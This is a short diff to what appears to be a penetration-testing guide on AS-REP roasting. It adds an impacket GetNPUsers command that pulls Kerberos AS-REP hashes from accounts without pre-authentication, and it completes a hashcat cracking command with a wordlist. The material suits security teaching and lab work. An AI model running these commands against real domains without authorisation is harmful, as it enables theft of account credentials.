@@ -77,6 +77,10 @@ git clone https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
 GetNPUsers.py $DOMAIN_NAME.local/$USER -dc-ip $DC_IP -no-pass
 ```
 
+```bash
+impacket-GetNPUsers $DOMAIN/$USER -dc-ip $DC_IP -dc-host $DOMAIN -no-pass
+```
+
 Save the hash in the file and move on.
 
 ## Crack the TGT
@@ -94,7 +98,7 @@ john $tgt_hash.txt --fork=4 -w=/PATH/TO/rockyou.txt
 ```
 
 ```bash
-hashcat -m 18200 --force -a 0 $tgt_hash.txt 
+hashcat -m 18200 --force -a 0 $tgt_hash.txt PASS_LIST.txt
 ```
 
 
